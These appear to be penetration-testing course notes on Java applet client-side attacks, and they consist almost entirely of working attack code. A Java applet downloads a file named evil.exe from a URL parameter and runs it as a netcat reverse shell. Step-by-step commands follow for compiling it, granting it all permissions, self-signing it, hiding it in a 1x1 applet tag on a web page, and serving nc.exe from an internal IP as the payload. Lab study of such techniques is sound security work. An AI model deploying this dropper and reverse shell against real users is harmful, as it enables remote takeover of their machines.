# Java Applets

> Java applets were small applications written in the Java programming language, or another programming language that compiles to Java bytecode, and delivered to users in the form of Java bytecode.  

## Exploit

```java
import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*; 
/** 
		*  Author: Offensive Security 
		*  This Java applet will download a file and execute it. **/ 
public class Java extends Applet {
	private Object initialized = null;

	public Object isInitialized() {
		return initialized;
	}

	public void init() {
		Process f;
		try {
			String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
			String expath = tmpdir + "evil.exe";
			String download = "";
			download = getParameter("1");
			
			if (download.length() > 0) { // URL parameter
				URL url = new URL(download);
				// Get an input stream for reading
				InputStream in = url.openStream();
				// Create a buffered input stream for efficency
				BufferedInputStream bufIn = new BufferedInputStream(in);
				File outputFile = new File(expath);
				OutputStream out = new BufferedOutputStream(new
					FileOutputStream(outputFile));
				byte[] buffer = new byte[2048];
				for (;;) {
					int nBytes = bufIn.read(buffer);
					if (nBytes <= 0) break;
					out.write(buffer, 0, nBytes);
				}
				out.flush();
				out.close();
				in.close();
			}
			f = Runtime.getRuntime().exec("cmd.exe /c " + expath + "<ip> 443 -e cmd.exe"); 
		} catch(IOException e) { 
			e.printStackTrace();
		}
		/* ended here and commented out below for bypass */ 
		catch (Exception exception) {
			exception.printStackTrace();
		}
	}
}
```

## Compile, sign, etc.

```bash
javac -source 1.7 -target 1.7 Java.java
echo “Permissions: all-permissions” > /root/manifest.txt
jar cvf Java.jar Java.class
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
```

-> fill in with bullshit
```bash
jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
cp Java.class SignedJava.jar /var/www/html/
```

## Make exploit available to the target

```bash
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.5:80/evil.exe"></applet>' > /var/www/html/java.html
```

```bash
locate nc.exe
cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe
```
